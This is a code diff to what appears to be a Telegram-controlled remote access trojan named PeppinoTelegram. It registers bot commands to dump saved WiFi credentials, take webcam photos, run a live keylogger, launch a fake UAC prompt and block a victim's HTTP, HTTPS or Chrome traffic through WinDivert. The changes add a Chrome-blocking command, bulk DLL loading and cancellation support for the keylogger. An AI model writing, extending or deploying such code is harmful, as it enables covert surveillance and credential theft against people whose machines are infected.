@@ -91,15 +91,6 @@ BURN_DIRECTORY = gettempdir()
 TELEGRAM_BOT_LIMIT = 30 * 1024 * 1024  # 50 MB(I put 30MB just because 50 crashed a lot)
 GENERATE_COMMANDS_MD = False
 
-load_dll(r"assets\dlls\WinDivert64.dll")
-#UTILS
-import pyngrok
-from utils import *
-try:
-    from plugins import *
-except ImportError as e:
-    print(f"Plugins not loaded\n{e}\n")
-    plugins = None
 
 try:
     vfx = resource_path(join("assets", "vfx"))
@@ -108,9 +99,22 @@ try:
     fake_uac_prompt_path = join(executables, "fakeuac.exe")
     prototxt_filename = resource_path(join("assets","model","1.prototxt"))
     caffemodel_filename = resource_path(join("assets","model","2.caffemodel"))
+    DLLS_DIR = resource_path(join("assets", "dlls"))
 except Exception as e:
     print(e)
     exit()
+
+for file in listdir(DLLS_DIR):
+    if file.endswith(".dll"):
+        load_dll(join(DLLS_DIR, file))
+#UTILS
+import pyngrok
+from utils import *
+try:
+    from plugins import *
+except ImportError as e:
+    print(f"Plugins not loaded\n{e}\n")
+    plugins = None
 
 def _patched_popen(*args, **kwargs):
     cmd_list = []
@@ -440,9 +444,6 @@ class PeppinoTelegram:
             Command("wifiinfo", self.wifiinfo, "Show saved WiFi credentials.", "network", "📶 Wifiinfo"),
             Command("getip", self.getip, "Get public IP and location.", "network", "🌐 Get IP"),
             Command("urltoast", notify_toast, "Show Windows toast with URL.", "network", "🔗 URL Toast"),
-            Command("block_port", self.block_port, "Block a specific TCP/UDP port.", "network", "🚫 Block Port"),
-            Command("block_http", self.block_http, "Block all outbound HTTP traffic (port 80).", "network", "🚫 Block HTTP"),
-            Command("block_https", self.block_https, "Block all outbound HTTPS traffic (port 443).", "network", "🚫 Block HTTPS"),
 
             # 📸 Camera & Screen
             Command("selfie", self.selfie, "Take webcam photo.", "camera", "🤳 Webcam Snapshot"),
@@ -554,9 +555,10 @@ class PeppinoTelegram:
             Command("livekeylogger", self.live_keylogger, "Live keystroke monitoring.", "keylogger", "📡 Livekeylogger"),
 
             # 🕵️‍♂️ MITM
-            Command("block_port", self.block_port, "Blocks traffic on a specific port.", "️mitm", "Block Port"),
-            Command("block_http", self.block_http, "Blocks traffic http", "mitm", "Block HTTP"),
-            Command("block_https", self.block_https, "Blocks traffic on a specific port.", "mitm", "Block HTTPS"),
+            Command("block_port", self.block_port, "Block a specific TCP/UDP port.", "mitm", "🚫 Block Port"),
+            Command("block_http", self.block_http, "Block all outbound HTTP traffic (port 80).", "mitm", "🚫 Block HTTP"),
+            Command("block_https", self.block_https, "Block all outbound HTTPS traffic (port 443).", "mitm", "🚫 Block HTTPS"),
+            Command("block_chrome", self.block_chrome, "Blocks traffic on chrome.", "mitm", "🚫 Block CHROME"),
 
             # 🔧 Utilities & Testing
             Command("get_logs", self.get_logs, "Gets the program logs ins a file", "utility", "📄 Get Logs"),
@@ -623,25 +625,27 @@ class PeppinoTelegram:
         print(f"Asking yes/no: {custom_message}")
         return self.send_prompt(custom_message).lower().strip() == "y"
     
-    # TODO: loading bar not updating!!
+    @requires_admin
+    def block_chrome(self, timeout: int) -> None:
+        print(f"Blocking chrome for {timeout} seconds")
+        loading_bar = self.new_loading_bar_timed_worker("Blocking Chrome", timeout, block_chrome, (timeout,))
+        loading_bar.start()
+
     @requires_admin
     def block_port(self, port: int, timeout: int) -> None:
         print(f"Blocking port {port} for {timeout} seconds")
-        print("blocking port")
-        loading_bar = self.new_loading_bar_timed_worker("Blocking Port", timeout, block_port, (port, timeout))
+        loading_bar = self.new_loading_bar_timed_worker("Blocking Port", timeout, lambda x: block_port(port, timeout))
         loading_bar.start()
 
     @requires_admin
     def block_http(self, timeout: int) -> None:
         print(f"Blocking HTTP for {timeout} seconds")
-        print("blocking http")
         loading_bar = self.new_loading_bar_timed_worker("Blocking HTTP", timeout, block_http, (timeout,))
         loading_bar.start()
 
     @requires_admin
     def block_https(self, timeout: int) -> None:
         print(f"Blocking HTTPS for {timeout} seconds")
-        print("blocking https")
         loading_bar = self.new_loading_bar_timed_worker("Blocking HTTPS", timeout, block_https, (timeout,))
         loading_bar.start()
 
@@ -1063,11 +1067,11 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
                     k = name
                 state["value"]+=k
 
+    @cancellable(check_interval=0.08)  # ← adds auto-check loop
     def keylogger(self, timeout: int = 10) -> None:
         """
         Captures keystrokes for `timeout` seconds.
-        Fully cancellable via the loading bar's cancel button.
-        No temporary files — result sent directly via in-memory BytesIO.
+        Fully cancellable via loading bar cancel button.
         """
         self.bsend(f"⌨️ Keylogger started — {timeout} seconds (cancel anytime)")
 
@@ -1080,7 +1084,6 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             total=timeout,
             label="Keylogger",
             showperc=True,
-            # autodelete=False  ← usually fine to let it stay visible after finish
         )
 
         start_time = monotonic()
@@ -1095,7 +1098,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
                     self.bsend("🛑 Keylogger cancelled by user")
                     return
 
-                # Blocking call — this is the main limitation
+                # Blocking call — decorator handles interruption via cancel_event
                 event = read_event(suppress=False)
 
                 if event.event_type == KEY_DOWN:
@@ -1112,7 +1115,6 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
                         continue
 
                     char = None
-
                     if len(name) == 1:
                         char = name
                         if shift_pressed != caps_on:
@@ -1138,9 +1140,10 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
                         buffer.append(char)
 
                 elif event.event_type == KEY_UP:
-                    if event.name.lower() in ("left shift", "right shift"):
+                    name_lower = event.name.lower()
+                    if name_lower in ("left shift", "right shift"):
                         shift_pressed = False
-                    if event.name.lower() in ("left ctrl", "right ctrl"):
+                    if name_lower in ("left ctrl", "right ctrl"):
                         ctrl_pressed = False
 
             loading.fill_and_delete()
@@ -2181,8 +2184,15 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
     def connectioncheckerloop(self):
         print("Starting connection checker loop")
         while self.running:
+            chk = False
+            if not self.connected:
+                chk = True
             self.connected = check_connection()
-            sleep(15 if self.connected else 5)
+            if self.connected and chk:
+                print(f"Connection got back at {now()}")
+            if not self.connected:
+                print(f"Connection lost at {now()}")
+            sleep(5)
 
 
     def setCameraAsWallpaper(self, seconds: float|int=5):
